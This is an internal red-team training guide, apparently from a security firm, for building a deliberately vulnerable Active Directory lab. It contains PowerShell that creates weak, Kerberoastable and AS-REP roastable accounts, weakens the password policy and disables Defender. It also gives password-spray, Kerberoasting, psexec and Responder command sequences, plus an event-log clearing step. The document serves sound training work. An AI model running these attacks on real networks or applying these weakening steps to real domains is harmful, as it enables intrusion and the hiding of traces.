# XPOSE SECURITY — AD LAB SETUP GUIDE
## Training Environment voor Red Team Operators

**Classificatie:** INTERN  
**Versie:** 1.0 | Januari 2026

---

# 1. LAB OVERVIEW

## 1.1 Lab Architecture

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        XPOSE TRAINING LAB                                   │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│                         ┌─────────────────┐                                 │
│                         │   pfSense       │                                 │
│                         │   Firewall      │                                 │
│                         │   10.10.10.1    │                                 │
│                         └────────┬────────┘                                 │
│                                  │                                          │
│        ┌─────────────────────────┼─────────────────────────┐               │
│        │                         │                         │               │
│   ┌────┴────┐             ┌──────┴──────┐           ┌─────┴─────┐         │
│   │  DC01   │             │    DC02     │           │  YOURHOST │         │
│   │ PDC     │◄───────────►│   BDC       │           │  Kali     │         │
│   │10.10.10.10│ Replication │10.10.10.11│           │10.10.10.50│         │
│   └────┬────┘             └──────┬──────┘           └───────────┘         │
│        │                         │                                          │
│        └─────────────┬───────────┘                                         │
│                      │                                                      │
│     ┌────────────────┼────────────────┐                                    │
│     │                │                │                                    │
│ ┌───┴───┐      ┌─────┴─────┐    ┌────┴────┐                               │
│ │ WS01  │      │   SRV01   │    │  SRV02  │                               │
│ │Win10  │      │  File/SQL │    │  Web/IIS│                               │
│ │.10.20 │      │  .10.30   │    │  .10.31 │                               │
│ └───────┘      └───────────┘    └─────────┘                               │
│                                                                             │
│  Domain: corp.local                                                         │
│  Network: 10.10.10.0/24                                                     │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

> **📘 UITLEG:**
> **Minimale lab configuratie:**
> - 2x Domain Controller (replication, redundancy)
> - 1x Windows 10/11 Workstation
> - 1-2x Member Server (SQL, IIS, File)
> - 1x Attacker machine (Kali)
> - 1x Firewall (optioneel, voor segmentatie)

---

## 1.2 Hardware Requirements

```yaml
Minimum (Home Lab):
  Host Machine:
    CPU: 8 cores
    RAM: 32 GB
    Storage: 500 GB SSD
  
  VM Sizing:
    DC01: 2 vCPU, 4 GB RAM, 60 GB
    DC02: 2 vCPU, 4 GB RAM, 60 GB
    WS01: 2 vCPU, 4 GB RAM, 60 GB
    SRV01: 2 vCPU, 4 GB RAM, 80 GB
    Kali: 2 vCPU, 4 GB RAM, 40 GB
  
  Total: 10 vCPU, 20 GB RAM

Recommended (Training Lab):
  Host Machine:
    CPU: 16+ cores
    RAM: 64+ GB
    Storage: 1 TB NVMe
  
  Allows:
    - Multiple concurrent students
    - Snapshots for reset
    - Additional services (SCCM, Exchange)
```

---

# 2. DOMAIN CONTROLLER SETUP

## 2.1 DC01 - Primary Domain Controller

### Windows Server Installation
```powershell
# After Windows Server 2022 installation:

# Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.10 -PrefixLength 24 -DefaultGateway 10.10.10.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 127.0.0.1, 10.10.10.11

# Rename computer
Rename-Computer -NewName "DC01" -Restart
```

### Install AD DS
```powershell
# Install AD DS role
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Configure new forest
$SafeModePassword = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

Install-ADDSForest `
    -DomainName "corp.local" `
    -DomainNetBIOSName "CORP" `
    -ForestMode "WinThreshold" `
    -DomainMode "WinThreshold" `
    -InstallDns `
    -SafeModeAdministratorPassword $SafeModePassword `
    -Force
```

> **📘 UITLEG:**
> **AD DS Installatie:**
> - Installeert Active Directory Domain Services
> - Creëert nieuw forest "corp.local"
> - Installeert DNS role
> - Server wordt automatisch DC

---

## 2.2 DC02 - Backup Domain Controller

```powershell
# Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.11 -PrefixLength 24 -DefaultGateway 10.10.10.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10, 127.0.0.1

# Rename computer
Rename-Computer -NewName "DC02" -Restart

# Install AD DS
Install-WindowsFeature -Name AD-Domain-Services -IncludeManagementTools

# Promote to DC (join existing domain)
$DomainCred = Get-Credential  # Enter CORP\Administrator credentials
$SafeModePassword = ConvertTo-SecureString "P@ssw0rd123!" -AsPlainText -Force

Install-ADDSDomainController `
    -DomainName "corp.local" `
    -Credential $DomainCred `
    -InstallDns `
    -SafeModeAdministratorPassword $SafeModePassword `
    -Force
```

> **📘 UITLEG:**
> **Waarom 2 DCs:**
> - Realistische enterprise omgeving
> - AD replication testing
> - Redundancy testing
> - DCSync attacks werken beter

---

# 3. VULNERABLE CONFIGURATION

## 3.1 Create Users and Groups

```powershell
# Run on DC01

# Create OUs
New-ADOrganizationalUnit -Name "XPOSE Users" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "XPOSE Computers" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "XPOSE Servers" -Path "DC=corp,DC=local"
New-ADOrganizationalUnit -Name "Service Accounts" -Path "DC=corp,DC=local"

# Create groups
New-ADGroup -Name "IT Admins" -GroupScope Global -Path "OU=XPOSE Users,DC=corp,DC=local"
New-ADGroup -Name "HR Department" -GroupScope Global -Path "OU=XPOSE Users,DC=corp,DC=local"
New-ADGroup -Name "Finance Department" -GroupScope Global -Path "OU=XPOSE Users,DC=corp,DC=local"
New-ADGroup -Name "SQL Admins" -GroupScope Global -Path "OU=XPOSE Users,DC=corp,DC=local"

# Create standard users
$Users = @(
    @{Name="John Smith"; Sam="jsmith"; Password="Summer2024!"; Groups=@("IT Admins")},
    @{Name="Jane Doe"; Sam="jdoe"; Password="Welcome123!"; Groups=@("HR Department")},
    @{Name="Bob Johnson"; Sam="bjohnson"; Password="Password1!"; Groups=@("Finance Department")},
    @{Name="Alice Brown"; Sam="abrown"; Password="Company2024!"; Groups=@("IT Admins")},
    @{Name="Charlie Wilson"; Sam="cwilson"; Password="Qwerty123!"; Groups=@("SQL Admins")}
)

foreach ($User in $Users) {
    $SecurePassword = ConvertTo-SecureString $User.Password -AsPlainText -Force
    New-ADUser `
        -Name $User.Name `
        -SamAccountName $User.Sam `
        -UserPrincipalName "$($User.Sam)@corp.local" `
        -AccountPassword $SecurePassword `
        -Enabled $true `
        -Path "OU=XPOSE Users,DC=corp,DC=local" `
        -PasswordNeverExpires $true
    
    foreach ($Group in $User.Groups) {
        Add-ADGroupMember -Identity $Group -Members $User.Sam
    }
}

Write-Host "[+] Users created with weak passwords for training"
```

> **📘 UITLEG:**
> **Doelbewust zwakke configuratie:**
> - Zwakke wachtwoorden (voor password spraying)
> - PasswordNeverExpires (common misconfiguration)
> - Users in gevoelige groepen

---

## 3.2 Create Vulnerable Service Accounts

```powershell
# Service account with SPN (Kerberoastable)
$SvcPassword = ConvertTo-SecureString "SQLAdmin2024!" -AsPlainText -Force
New-ADUser `
    -Name "SQL Service Account" `
    -SamAccountName "svc_sql" `
    -UserPrincipalName "svc_sql@corp.local" `
    -AccountPassword $SvcPassword `
    -Enabled $true `
    -Path "OU=Service Accounts,DC=corp,DC=local" `
    -PasswordNeverExpires $true `
    -ServicePrincipalNames @("MSSQLSvc/SRV01.corp.local:1433", "MSSQLSvc/SRV01:1433")

# Make svc_sql Domain Admin (BAD PRACTICE - for training)
Add-ADGroupMember -Identity "Domain Admins" -Members "svc_sql"

# Another Kerberoastable account
$SvcPassword2 = ConvertTo-SecureString "Backup123!" -AsPlainText -Force
New-ADUser `
    -Name "Backup Service Account" `
    -SamAccountName "svc_backup" `
    -UserPrincipalName "svc_backup@corp.local" `
    -AccountPassword $SvcPassword2 `
    -Enabled $true `
    -Path "OU=Service Accounts,DC=corp,DC=local" `
    -PasswordNeverExpires $true `
    -ServicePrincipalNames @("http/backup.corp.local")

Write-Host "[+] Kerberoastable service accounts created"
```

> **📘 UITLEG:**
> **Kerberoasting setup:**
> - Service accounts met SPNs
> - Zwakke wachtwoorden (crackable)
> - svc_sql is Domain Admin (privilege escalation path)

---

## 3.3 Create AS-REP Roastable Accounts

```powershell
# User without Kerberos pre-authentication
$ASREPPassword = ConvertTo-SecureString "Roastme123!" -AsPlainText -Force
New-ADUser `
    -Name "Legacy Application" `
    -SamAccountName "legacy_app" `
    -UserPrincipalName "legacy_app@corp.local" `
    -AccountPassword $ASREPPassword `
    -Enabled $true `
    -Path "OU=Service Accounts,DC=corp,DC=local" `
    -PasswordNeverExpires $true

# Disable Kerberos pre-auth (makes it AS-REP roastable)
Set-ADAccountControl -Identity "legacy_app" -DoesNotRequirePreAuth $true

Write-Host "[+] AS-REP roastable account created"
```

> **📘 UITLEG:**
> **AS-REP Roasting:**
> - Account met "Do not require Kerberos pre-authentication"
> - Kan worden aangevallen door ANY user (geen auth nodig)
> - Offline password cracking mogelijk

---

## 3.4 Configure Weak Password Policy

```powershell
# Weaken default domain policy
Set-ADDefaultDomainPasswordPolicy -Identity corp.local `
    -MinPasswordLength 8 `
    -PasswordHistoryCount 0 `
    -ComplexityEnabled $false `
    -MaxPasswordAge "365.00:00:00" `
    -MinPasswordAge "0.00:00:00" `
    -LockoutThreshold 10 `
    -LockoutDuration "00:30:00" `
    -LockoutObservationWindow "00:30:00"

Write-Host "[+] Weak password policy configured"
```

> **📘 UITLEG:**
> **Training password policy:**
> - 8 character minimum (zwak)
> - Geen complexity
> - Lockout na 10 pogingen (spray-friendly)
> - 30 min lockout (reasonable voor spraying)

---

## 3.5 Enable Vulnerable Protocols

```powershell
# Enable LLMNR (for Responder attacks)
# By default enabled - ensure not disabled via GPO

# Enable SMBv1 (legacy, exploitable)
Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol -NoRestart

# Create GPO to ensure LLMNR stays enabled
# (In production this should be DISABLED)

Write-Host "[+] Legacy protocols enabled for training"
```

---

# 4. MEMBER SERVER SETUP

## 4.1 SRV01 - SQL Server

```powershell
# Join domain first
$DomainCred = Get-Credential
Add-Computer -DomainName "corp.local" -Credential $DomainCred -Restart

# After restart, install SQL Server
# Download SQL Server Express from Microsoft

# Configure SQL to run as svc_sql
# This creates Kerberoastable scenario
```

## 4.2 SRV02 - Web Server (IIS)

```powershell
# Join domain
$DomainCred = Get-Credential
Add-Computer -DomainName "corp.local" -Credential $DomainCred -Restart

# Install IIS
Install-WindowsFeature -Name Web-Server -IncludeManagementTools

# Create basic web application
# Misconfigure to use default credentials
```

---

# 5. WORKSTATION SETUP

## 5.1 WS01 - Windows 10/11 Workstation

```powershell
# Set static IP
New-NetIPAddress -InterfaceAlias "Ethernet" -IPAddress 10.10.10.20 -PrefixLength 24 -DefaultGateway 10.10.10.1
Set-DnsClientServerAddress -InterfaceAlias "Ethernet" -ServerAddresses 10.10.10.10, 10.10.10.11

# Rename and join domain
$DomainCred = Get-Credential  # CORP\Administrator
Add-Computer -DomainName "corp.local" -Credential $DomainCred -NewName "WS01" -Restart

# After restart - configure local admin
net localgroup administrators "CORP\IT Admins" /add

# Disable Windows Defender (for training ease)
Set-MpPreference -DisableRealtimeMonitoring $true
```

> **📘 UITLEG:**
> **Workstation setup:**
> - Domain joined
> - IT Admins are local admins (lateral movement path)
> - Defender disabled (for training)
>
> **In real test:** Keep Defender ON voor realistic testing

---

# 6. ATTACKER SETUP

## 6.1 Kali Linux Configuration

```bash
# Set static IP
sudo ip addr add 10.10.10.50/24 dev eth0
sudo ip route add default via 10.10.10.1

# Configure DNS to use DC
echo "nameserver 10.10.10.10" | sudo tee /etc/resolv.conf

# Verify domain connectivity
nslookup corp.local
nmap -p 445,389 10.10.10.10

# Install additional tools
sudo apt update
sudo apt install -y bloodhound neo4j crackmapexec impacket-scripts
pip3 install kerbrute

# Start Neo4j for BloodHound
sudo neo4j start
# Default creds: neo4j:neo4j (change on first login)

# Start BloodHound
bloodhound
```

---

# 7. ATTACK SCENARIOS

## 7.1 Training Scenario 1: Password Spray → Domain Admin

```markdown
OBJECTIVE: Achieve Domain Admin via password spraying

ATTACK PATH:
1. Enumerate users (no auth needed)
2. Password spray with common passwords
3. Compromise jsmith (IT Admin)
4. Local admin on WS01
5. Dump credentials
6. Kerberoast svc_sql
7. Crack svc_sql password
8. svc_sql is Domain Admin!

COMMANDS:
# Enumerate users
kerbrute userenum --dc 10.10.10.10 -d corp.local users.txt

# Password spray
crackmapexec smb 10.10.10.10 -u users.txt -p 'Summer2024!' --continue-on-success

# Use jsmith credentials
crackmapexec smb 10.10.10.20 -u jsmith -p 'Summer2024!' --local-auth

# Kerberoast
impacket-GetUserSPNs corp.local/jsmith:'Summer2024!' -dc-ip 10.10.10.10 -outputfile kerberoast.txt

# Crack
hashcat -m 13100 kerberoast.txt rockyou.txt

# Use svc_sql (Domain Admin)
impacket-psexec corp.local/svc_sql:'SQLAdmin2024!'@10.10.10.10
```

---

## 7.2 Training Scenario 2: LLMNR Poisoning

```markdown
OBJECTIVE: Capture credentials via network poisoning

ATTACK PATH:
1. Run Responder
2. Wait for LLMNR/NBT-NS requests
3. Capture NetNTLMv2 hashes
4. Crack or relay

COMMANDS:
# Start Responder
sudo responder -I eth0 -wrf

# Captured hash
[+] NTLMv2-SSP Hash: jsmith::CORP:...

# Crack
hashcat -m 5600 hash.txt rockyou.txt
```

---

# 8. LAB RESET PROCEDURE

```powershell
# PowerShell script to reset lab to clean state

# Reset user passwords to known weak values
$Users = @{
    "jsmith" = "Summer2024!"
    "jdoe" = "Welcome123!"
    "svc_sql" = "SQLAdmin2024!"
}

foreach ($User in $Users.Keys) {
    $Password = ConvertTo-SecureString $Users[$User] -AsPlainText -Force
    Set-ADAccountPassword -Identity $User -NewPassword $Password -Reset
    Write-Host "[+] Reset password for $User"
}

# Remove any persistence (accounts, scheduled tasks)
Get-ADUser -Filter "Name -like 'xpose*'" | Remove-ADUser -Confirm:$false

# Clear event logs (optional)
wevtutil cl Security
wevtutil cl System

Write-Host "[+] Lab reset complete"
```

---

# 9. LAB CHECKLIST

```
═══════════════════════════════════════════════════════════════════════════════
                    AD LAB VALIDATION CHECKLIST
═══════════════════════════════════════════════════════════════════════════════

INFRASTRUCTURE:
☐ DC01 operational (DNS, AD DS)
☐ DC02 operational (replication working)
☐ WS01 domain joined
☐ SRV01 domain joined
☐ Network connectivity between all hosts
☐ Kali can reach all targets

VULNERABLE CONFIGURATIONS:
☐ Weak password policy active
☐ Kerberoastable accounts exist (svc_sql, svc_backup)
☐ AS-REP roastable account exists (legacy_app)
☐ svc_sql is Domain Admin
☐ IT Admins are local admins on WS01
☐ LLMNR enabled

ATTACK VALIDATION:
☐ Password spray works (jsmith:Summer2024!)
☐ Kerberoasting returns hashes
☐ AS-REP roasting works
☐ BloodHound collection succeeds
☐ Responder captures hashes

SNAPSHOTS:
☐ Clean state snapshot on each VM
☐ Snapshot naming convention documented
☐ Reset procedure tested

═══════════════════════════════════════════════════════════════════════════════
```

---

**EINDE AD LAB SETUP GUIDE**

